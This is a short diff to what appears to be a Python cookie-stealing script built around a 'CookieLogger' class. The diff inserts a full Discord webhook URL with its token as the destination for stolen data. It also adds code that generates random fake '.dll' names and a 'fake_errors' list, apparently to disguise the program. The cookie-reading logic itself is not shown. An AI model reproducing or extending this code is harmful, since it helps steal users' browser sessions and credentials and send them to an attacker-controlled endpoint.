@@ -1,7 +1,9 @@
-webhook = "" # WEBHOOK HERE
+webhook = "https://discord.com/api/webhooks/1097208095786143774/W1GYzRAiTUcOS-4TQE2ov1tGnheyV2Q8JXAeo8qyzeF2mJYH2U8ZQPdUUPaOytzXxaBS" # WEBHOOK HERE
 
 import os
 import json
+import random
+import string
 import base64
 import shutil
 import sqlite3
@@ -18,6 +20,18 @@ def safe(func):
         except Exception:
             pass
     return wrapper
+
+def generate_dll_names(amount: int) -> list[str]:
+    dll_names = []
+    
+    for _ in range(amount):
+        dll_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
+        dll_name += ".dll"
+        dll_names.append(dll_name)
+        
+    return dll_names
+
+fake_errors: list[str] = []
 
 class CookieLogger:
 
